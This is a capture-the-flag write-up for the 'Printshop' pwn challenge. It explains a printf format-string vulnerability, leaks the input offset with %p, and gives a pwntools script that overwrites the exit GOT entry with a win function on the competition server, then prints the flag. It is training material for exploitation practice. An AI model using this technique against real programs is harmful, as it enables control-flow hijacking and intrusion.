# Binary Exploitation

## Printshop
<!--GOT , -->

That print shop down the road is useless, can you make it do something interesting?

File: https://github.com/MasonCompetitiveCyber/PatriotCTF2023/blob/main/pwn/printshop/printshop

---

### Solution

In this challenge, the exploit revolved around using a printf format string vulnerability. This allowed the attacker to manipulate the Global Offset Table (GOT) by overwriting the exit function's address with that of the win function.

#### 1. Dissassembled the Binary.

```C
void main(void)

{
  long in_FS_OFFSET;
  char local_78 [104];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  puts("\nWelcome to the Print Shop!");
  printf("\nWhat would you like to print? >> ");
  fgets(local_78,100,stdin);
  puts("\nThank you for your buisness!\n");
  printf(local_78);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

#### 2. Leakead the Input Offset using format string vuln (%p).

```bash
$ ./printshop 
What would you like to print? >> ABCDEFGH %p.%p.%p.%p.%p.%p.%p.%p.%p.%p

Thank you for your buisness!

ABCDEFGH 0x7f6cc2702803.(nil).0x7f6cc2625b00.0xe0c0.(nil).0x4847464544434241.0x252e70252e702520.0x2e70252e70252e70.0x70252e70252e7025.0xa70252e70252e
```

Our input is exactly at the 6th %p. ABCDEFGH =:= 0x4847464544434241

#### 3. PWNTOOLS fmtstr_payload

```python
# payload.py
from pwn import *

elf = context.binary = ELF('./printshop')
# p = process("./printshop")
p = remote("chal.pctf.competitivecyber.club", 7997)

payload = fmtstr_payload(6, {elf.got["exit"] : elf.sym["win"]})
p.sendline(payload)
p.interactive()
```

### PCTF{b4by_f0rm4t_wr1t3_6344792}